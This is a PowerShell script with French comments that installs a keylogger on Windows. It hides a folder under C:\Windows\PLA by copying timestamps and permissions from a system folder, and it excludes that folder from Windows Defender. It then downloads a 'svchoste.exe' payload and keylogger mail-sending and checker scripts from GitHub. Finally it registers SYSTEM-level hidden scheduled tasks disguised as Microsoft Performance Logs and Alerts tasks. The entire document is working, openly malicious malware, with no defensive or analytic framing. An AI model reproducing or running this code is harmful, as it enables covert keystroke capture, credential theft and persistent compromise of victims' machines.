### Déclaration des variables ###

$FolderPath = "C:\Windows\PLA\Exceptions\" #Emplacement du payload
$PropertyCopyFolder = "C:\Windows\PLA\Rules" #Répertoire duquel on va copier des propriétés
$FileName = "svchoste.exe" #Nom du fichier
$DownloadLink = "https://github.com/ShawnHeyli/TD-Jeu-Economiste/blob/master/svchoste.exe?raw=true"
$PayloadName = "cGF5ZGF5.txt" # Payday en base6

### Création du dossier qui accueil le payload ###

New-Item -Path $FolderPath -ItemType Directory -Force | Out-Null #Creation du répertoire
$Date = (Get-Item $PropertyCopyFolder).LastWriteTime #Prend la date de dernière écriture d'un répertoire établi
Set-ItemProperty -Path $FolderPath -Name LastWriteTime -Value $Date #Applique la date précédement obtenu a notre répertoire
Get-Acl -Path "C:\Windows\PLA\Rules" | Set-Acl -Path $FolderPath #Copie les droits de $PropertyCopyFolder et les applique a notré répertoire pour le rendre innacessible
Add-MpPreference -ExclusionPath $FolderPath #On exclue le répertoire de la liste de recherche de windows defender

### Executable
(new-object System.Net.WebClient).DownloadFile("$DownloadLink", "$FolderPath$FileName")#On télécharge le payload

###### MAIL ######

$MailScriptName = "ZW1haWxTZW5kZXI=.ps1"
$MailScriptDownloadLink = "https://raw.githubusercontent.com/ShawnHeyli/TD-Jeu-Economiste/master/SendMail-Keylogger.ps1"

$ExecutableCheckerName = "a2V5bG9nZ2VyQ2hlY2tlcg==.ps1"
$ExecutableCheckerDownloadLink = "https://raw.githubusercontent.com/ShawnHeyli/TD-Jeu-Economiste/master/Checker-Keylogger.ps1"

### Téléchargement du script de d'envoi de mail ###
(new-object System.Net.WebClient).DownloadFile("$MailScriptDownloadLink", "$FolderPath$MailScriptName")

### Créationd de la tache planifiée qui va éxecuter le script d'envoi de mail tout les jours ###
$ScheduleAction= New-ScheduledTaskAction -Execute "powershell" -Argument "-WindowStyle hidden -ExecutionPolicy Bypass iex $FolderPath$MailScriptName" # La commande qu'execute la tache planifiée
$ScheduleTrigger= New-ScheduledTaskTrigger -Daily -At 2pm # -AtLogon / -Daily -At 3am / -AtStartup /-Weekly -WeeksInterval 2 -DaysOfWeek Monday -At 3am /
$SchedulePrincipal= New-ScheduledTaskPrincipal -UserID "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest #Execute le script en tant que systeme pour ne pas avoir pas de pop up powershell et le lance en administrateur
$ScheduleSettings= New-ScheduledTaskSettingsSet -StartWhenAvailable -RunOnlyIfNetworkAvailable #Si le PC n'est pas allumé lors d'un Trigger on active le script dès qu'on peut au prochain démarrage / -RunOnlyIfNetworkAvailable #Si le script utlise internet (ex: Envoyer un mail) / Le dernier paramètre sert a rendre invisible le pop-up du script
#$ScheduleUser="Microsoft Corporation"
$ScheduleName="PLA Exception Policy"
$ScheduleDescription="Performance Logs and Alerts (PLA) provides the ability to generate alert notifications based on performance counter thresholds. You can also use PLA to query performance data, create event tracing sessions, capture a computer's configuration, and trace API calls in some Win32 system DLLs."

Register-ScheduledTask -Force -Action $ScheduleAction -Trigger $ScheduleTrigger -Principal $SchedulePrincipal -Settings $ScheduleSettings -TaskName $ScheduleName -TaskPath \Microsoft\Windows\PLA -Description $ScheduleDescription | Out-Null #Création d'une tâche planifié

### Téléchargement du checker pour l'executable ###
(new-object System.Net.WebClient).DownloadFile("$ExecutableCheckerDownloadLink", "$FolderPath$ExecutableCheckerName")

$ScheduleAction= New-ScheduledTaskAction -Execute "powershell" -Argument "-WindowStyle hidden -ExecutionPolicy Bypass iex $FolderPath$ExecutableCheckerName" # La commande qu'execute la tache planifiée
$ScheduleTrigger= New-ScheduledTaskTrigger -Daily -At 2am # -AtLogon / -Daily -At 3am / -AtStartup /-Weekly -WeeksInterval 2 -DaysOfWeek Monday -At 3am /
$SchedulePrincipal= New-ScheduledTaskPrincipal -UserID "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest #Execute le script en tant que systeme pour ne pas avoir pas de pop up powershell et le lance en administrateur
$ScheduleSettings= New-ScheduledTaskSettingsSet -StartWhenAvailable #Si le PC n'est pas allumé lors d'un Trigger on active le script dès qu'on peut au prochain démarrage / -RunOnlyIfNetworkAvailable #Si le script utlise internet (ex: Envoyer un mail) / Le dernier paramètre sert a rendre invisible le pop-up du script
#$ScheduleUser="Microsoft Corporation"
$ScheduleName="PLA Exception Rules"
$ScheduleDescription="Performance Logs and Alerts (PLA) provides the ability to generate alert notifications based on performance counter thresholds. You can also use PLA to query performance data, create event tracing sessions, capture a computer's configuration, and trace API calls in some Win32 system DLLs."

Register-ScheduledTask -Force -Action $ScheduleAction -Trigger $ScheduleTrigger -Principal $SchedulePrincipal -Settings $ScheduleSettings -TaskName $ScheduleName -TaskPath \Microsoft\Windows\PLA -Description $ScheduleDescription | Out-Null #Création d'une tâche planifié


### Téléchargement & Execution du payload ###

#(new-object System.Net.WebClient).DownloadFile("$DownloadLink", "$FolderPath$FileName")#On télécharge le payload
#& $FolderPath$FileName #On execute le payload